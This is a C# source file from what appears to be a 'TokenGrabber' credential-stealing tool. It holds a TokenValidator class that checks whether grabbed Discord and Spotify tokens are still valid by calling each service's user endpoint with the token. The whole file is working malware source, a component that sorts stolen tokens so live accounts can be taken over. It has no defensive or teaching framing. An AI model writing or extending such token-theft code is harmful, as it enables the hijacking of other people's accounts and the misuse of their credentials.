namespace TokenGrabber.Core;

using System.Net.Http.Headers;
using TokenGrabber.Models;

internal sealed class TokenValidator
{
    private readonly HttpClient _httpClient;
    private const string DiscordApiBase = "https://discord.com/api/v10";

    public TokenValidator()
    {
        _httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
    }

    public async Task<bool> ValidateAsync(GrabbedToken token)
    {
        return token.Platform switch
        {
            "Discord" => await ValidateDiscordAsync(token.Token),
            "Spotify" => await ValidateSpotifyAsync(token.Token),
            _ => true
        };
    }

    private async Task<bool> ValidateDiscordAsync(string token)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, $"{DiscordApiBase}/users/@me");
        request.Headers.Authorization = new AuthenticationHeaderValue(token);

        try
        {
            var response = await _httpClient.SendAsync(request);
            return response.IsSuccessStatusCode;
        }
        catch
        {
            return false;
        }
    }

    private async Task<bool> ValidateSpotifyAsync(string token)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "https://api.spotify.com/v1/me");
        request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);

        try
        {
            var response = await _httpClient.SendAsync(request);
            return response.IsSuccessStatusCode;
        }
        catch
        {
            return false;
        }
    }
}
